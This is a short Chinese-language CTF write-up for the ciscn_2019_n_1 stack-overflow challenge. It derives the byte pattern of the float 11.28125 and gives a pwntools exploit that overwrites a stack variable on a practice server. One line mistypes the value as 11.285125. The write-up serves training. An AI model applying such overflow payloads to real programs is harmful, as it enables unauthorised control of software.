# ciscn_2019_n_1

## 分析程序

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-14_19-50-33.png)

分析程序 可以得到，该题即为 栈溢出，所以需要填充栈，V1填充 使得 v2==11.28125 这样一个小数，**关键是得到 11.285125这样一个小数在栈中的存储形式**



## 小数的存储获取

### IDA获取

由于该题的数据 静态存储，已经存储在程序中，所以分析其汇编代码，**即可得到 其数据位 0x41348000** ，如下图所示：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-14_19-53-42.png)



### 程序获取

```c++
#include <iostream>
#include <iomanip>

using namespace std;

int main(){
  float num = 11.28125;
  unsigned char *p = (unsigned char *)&num;
  cout<<"0x"<< setfill('0') << hex
      <<setw(2) << (int)*(p+3)
      <<setw(2) << (int)*(p+2)
      <<setw(2) << (int)*(p+1)
      <<setw(2) << (int)*(p+0)<<endl;
  return 0;
}
```



## Payload

```python
from pwn import *

#io = process("/home/always/PWN/ciscn_2019_n_1")
io = remote("node4.buuoj.cn","29444")

val = p32(0x41348000)
payload = flat(44*'A',val)
io.sendline(payload)

io.interactive()
```

